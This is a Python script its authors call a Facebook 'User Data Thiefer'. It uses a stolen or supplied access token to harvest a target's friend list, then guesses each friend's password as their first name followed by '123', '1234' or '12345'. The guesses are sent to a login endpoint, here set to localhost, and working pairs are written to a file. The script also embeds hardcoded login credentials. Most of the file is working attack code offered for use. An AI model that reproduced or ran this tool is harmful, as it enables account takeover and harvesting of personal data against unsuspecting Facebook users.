import os, sys, time, requests, getpass, json, random, hashlib
from bs4 import BeautifulSoup
from datetime import datetime
idt = []
count = []
failed = []
logged = []
header = {
'user-agent':'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'}
os.system('clear')
try:
	os.mkdir('data')
except (FileExistsError):
	pass
logo = """ 
              ____   ___   ___  _  _   
             |___ \ / _ \ / _ \| || |  
               __) | | | | | | | || |_ 
              / __/| |_| | |_| |__   _|
             |_____|\___/ \___/   |_|
  }~~~~~~~~~~~~The Date Were We Born~~~~~~~~~~~~{
}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{"""
def reg():
	os.system('clear')
	try:
		open('data/reg.dat', 'r')
		script_login()
	except (FileNotFoundError):
		os.system('clear')
		print(logo)
		reg_user = input('Enter Script User Name:- ').upper()
		reg_key = input('Enter Script User Key:- ')
		reg_user = hashlib.md5(str(reg_user).encode('utf-8'))
		if reg_user.hexdigest() =="4564ce998cc67e8ced808b52b2cf694e" and reg_key =="15cd5d0023c4984c423c5587c64533f5 ":
			time.sleep(1)
			os.system('clear')
			print(logo)
			print("Script Register Sucessfull...")
			time.sleep(1)
			suc_reg = open('data/reg.dat', 'w')
			suc_reg.write('User Name:- This is not your creation\n')
			suc_reg.write('User Key:- This is Mr.Piece Creation\n')
			suc_reg.close()
			script_login()
		else:
			print("Invalid User Name or User Key")
			time.sleep(1)
			reg()
def script_login():
	os.system('clear')
	print(logo)
	print("       Login with User Name and User Pasword")
	print("}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{")
	user = input("Enter User Name To Login:- ").lower()
	pswd = input("Enter User Pasword To Login:- ").lower()
	if user == "usersiddharth" and pswd =="sachin@8145":
		print("Logged Sucessfull as: Badhshah")
		time.sleep(1)
		main()
	else:
		print("Invalid Username or Userpass...")
		time.sleep(1)
		script_login()
def main():
	os.system('clear')
	try:
		token = open('data/log.txt', 'r').read()
		ck_tk = json.loads(requests.get('https://graph.facebook.com/me?access_token='+token, headers=header).text)
		try:
			os.system('clear')
			id = ck_tk['id']
			name = ck_tk['name']
			print(logo)
			print("                Name:- "+name)
			print("                Id:- "+id)
			print("}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{")
			print("1~~~~~>> Start UDT (User Data Thiefer)")
			print("2~~~~~>> Abouts us")
			print("3~~~~~>> Exit")
			ch = input("Your Choice:- ").lower()
			if ch =="1" or ch =="start udt":
				UDT()
			elif ch =="2" or ch =="about":
				print("""This is open source Faceboook UDT (User Data Thiefer) in Python 3.9.6 Working on Requests lib in python
Devloped by 2004 Team in Nepal with all legal process
Owner : Badhshah
Author: Mr.Piece
Coder : Mr.Barnes""")
				input("Press Enter To Continue...")
				time.sleep(1)
				main()
			elif ch =="3" or ch =="0" or ch =="exit":
				time.sleep(1)
				os.system('exit')
			else:
				print("Invalid Argument...")
				time.sleep(1)
				main()
		except (KeyError):
			print("Your Token Is On Checkpoint")
			os.system('rm -rf data/log.txt')
			time.sleep(1)
			main()
	except (FileNotFoundError):
		print(logo)
		tok = input("Enter Your Token:- ")
		ck_tk = json.loads(requests.get('https://graph.facebook.com/me?access_token='+tok, headers=header).text)
		try:
			id = ck_tk['id']
			name = ck_tk['name']
			token = open('data/log.txt', 'w')
			token.write(tok)
			token.close()
			main()
		except (KeyError):
			print("Your Token Is On Checkpoint")
			time.sleep(1)
			main()
def UDT():
	os.system('clear')
	try:
		token = open('data/log.txt', 'r').read()
	except (FileNotFoundError):
		main()
	try:
		ck_tk = json.loads(requests.get('https://graph.facebook.com/me?access_token='+token, headers=header).text)
		name = ck_tk['name']
		id = ck_tk['id']
		print(logo)
		print("                Name:- "+name)
		print("                Id:- "+id)
		print("}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{")
		print('1~~~~~>> UDT On Public ID')
		print('2~~~~~>> UDT On Logged ID')
		print('3~~~~~>> Back')
		ch = input("Your Choice:- ")
		if ch == "1":
			os.system('clear')
			print(logo)
			print('                UDT On Public ID')
			print("}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{")
			pub_id = input("Enter Public ID Number:- ")
			sa = json.loads(requests.get('https://graph.facebook.com/'+pub_id+'/friends?access_token='+token, headers=header).text)
			if "error" in sa:
				print("ID Not Found...")
				UDT()
			else:
				run_udt(pub_id)
		elif ch =="2":
			os.system('clear')
			print(logo)
			print('                UDT On Logged ID')
			print("}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{")
			run_udt('me')
		elif ch =="3" or "0":
			main()
		else:
			print("Invalid Input...")
			time.sleep(1)
			UDT()
	except (KeyError):
		print("Your Token Is On Checkpoint")
		os.system('rm -rf data/log.txt')
		time.sleep(1)
		main()
		os.system('exit')
def run_udt(idz):
	try:
		token = open('data/log.txt', 'r').read()
	except (FileNotFoundError):
		main()
	try:
		dump_id = json.loads(requests.get('https://graph.facebook.com/'+idz+'/friends?access_token='+token, headers=header).text)
		name_id = json.loads(requests.get('https://graph.facebook.com/'+idz+'?access_token='+token, headers=header).text)
		print("Name:- "+name_id['name'])
		for a in dump_id['data']:
			try:
				id = a['id']
				count.append(id)
				name = a['name']
				fn = name.rsplit(' ')[0]
				idt.append(id+":"+fn)
			except (IndexError):
				pass
		print('Total Friends:- '+str(len(count)))
		print("}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{")
		logged_out = open('data/sucessfull.txt', 'w')
		failed_out = open('data/checkpoint.txt', 'w')
		for uid in idt:
			email = uid.split(':')[0]
			password = uid.split(':')[1]
			try:
				pass1 = password + "123"
				log = json.loads(requests.get('http://localhost:5000/auth?id='+ email +'&pass='+ pass1, headers=header).text)
				if "loc" in log:
					print("Logged Sucessfull:~ "+email+":"+pass1)
					logged_out.write("Sucessfull:"+email+":"+pass1+"\n")
					logged.append(email+pass1)
				elif "405" in log['error']:
					print("Logged Checkpoint:~ "+email+":"+pass1)
					failed_out.write("Checkpoint"+email+":"+pass1+"\n")
					failed.append(email+pass1)
				else:
					pass2 = password + "1234"
					log = json.loads(requests.get('http://localhost:5000/auth?id='+ email +'&pass='+ pass2, headers=header).text)
					if "loc" in log:
						print("Logged Sucessfull:~ "+email+":"+pass2)
						logged_out.write("Sucessfull:"+email+":"+pass2+"\n")
						logged.append(email+pass2)
					elif "405" in log['error']:
						print("Logged Checkpoint:~ "+email+":"+pass2)
						failed_out.write("Checkpoint"+email+":"+pass2+"\n")
						failed.append(email+pass2)
					else:
						pass3 = password + "12345"
						log = json.loads(requests.get('http://localhost:5000/auth?id='+ email +'&pass='+ pass3, headers=header).text)
						if "loc" in log:
							print("Logged Sucessfull:~ "+email+":"+pass3)
							logged_out.write("Sucessfull:"+email+":"+pass3+"\n")
							logged.append(email+pass3)
						elif "405" in log['error']:
							print("Logged Checkpoint:~ "+email+":"+pass3)
							failed_out.write("Checkpoint"+email+":"+pass3+"\n")
							failed.append(email+pass3)
						else:
							pass
			except:
				pass
	except:
		pass
	print("}~~~~~~~~~~~~~~~~~Scaning Complete~~~~~~~~~~~~~~~~{")
	print("Total ID Found Logged:~ "+str(len(logged))+", Failed:~ "+str(len(failed)))
	input("Press Enter To Continue...")
	sys.exit()
	
if __name__=='__main__':
	reg()
